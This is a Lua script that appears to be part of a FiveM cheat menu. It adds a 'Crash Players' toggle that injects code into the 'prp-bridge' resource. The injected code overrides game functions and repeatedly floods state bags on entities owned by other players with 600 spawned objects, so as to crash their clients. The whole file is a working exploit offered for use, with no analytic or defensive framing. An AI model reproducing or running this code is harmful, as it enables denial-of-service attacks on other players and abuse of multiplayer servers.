if isResourceRunning('prp-bridge') then
    exploitsMainTab[#exploitsMainTab + 1] = {
        id = 'crash_players_t1',
        name = 'Crash Players (T1)',
        checkbox = {
            action = function(actionData)
                if not actionData.checked then
                    MainAPI.InjectCode('prp-bridge', [[
                        MainAPI.DeleteTrackedThread('CrashEveryone')
                    ]])

                    return
                end

                MainAPI.InjectCode('prp-bridge', [[
                    _G.GetEntityFromStateBagName = function()
                        return 0
                    end

                    _G.CreateObject = function()
                        return 0
                    end

                    MainAPI.CreateTrackedThread('CrashEveryone', {
                        thread = function(self)
                            while self.isActive do
                                local setObjects = {}
                                local idx = GetGameTimer()..'_'..math.random(999999)

                                for i = 1, 600 do
                                    local key = 'obj:'..idx..':'..i

                                    setObjects[key] = {
                                        [1] = key,
                                        [2] = 'p_spinning_anus_s',
                                        [3] = 0,
                                        [4] = {
                                            x = 0.0,
                                            y = 0.0,
                                            z = 0.0
                                        },
                                        [5] = {
                                            x = 0.0,
                                            y = 0.0,
                                            z = 0.0
                                        },
                                        [6] = 1,
                                        [7] = {
                                            true,
                                            true,
                                            false,
                                            false
                                        },
                                        [8] = {}
                                    }
                                end

                                local targetEntity
                                local playerId = PlayerId()
                                local entities = {}
                                local peds = GetGamePool('CPed')
                                local objects = GetGamePool('CObject')
                                local vehicles = GetGamePool('CVehicle')

                                for i = 1, #peds do
                                    entities[#entities + 1] = peds[i]
                                end

                                for i = 1, #objects do
                                    entities[#entities + 1] = objects[i]
                                end

                                for i = 1, #vehicles do
                                    entities[#entities + 1] = vehicles[i]
                                end

                                for i = 1, #entities do
                                    local entity = entities[i]

                                    if NetworkGetEntityIsNetworked(entity) and NetworkGetEntityOwner(entity) ~= playerId then
                                        targetEntity = entity
                                        break
                                    end
                                end

                                if targetEntity then
                                    _G.SetClient_LastUsedCachedEntity = targetEntity

                                    local setEntity = MainAPI.SafeRunNative(Entity, targetEntity)
                                    MainAPI.SafeRunNative(setEntity.state.set, setEntity, 'VehTempAttachObjects', setObjects, true)
                                end

                                Wait(1000)
                            end
                        end,
                        onRemove = function()
                            local targetEntity = _G.SetClient_LastUsedCachedEntity

                            if targetEntity and NetworkGetEntityIsNetworked(targetEntity) and NetworkGetEntityOwner(targetEntity) ~= PlayerId() then
                                local setEntity = MainAPI.SafeRunNative(Entity, targetEntity)
                                MainAPI.SafeRunNative(setEntity.state.set, setEntity, 'VehTempAttachObjects', {}, true)
                            end
                        end
                    })
                ]])
            end
        }
    }
end

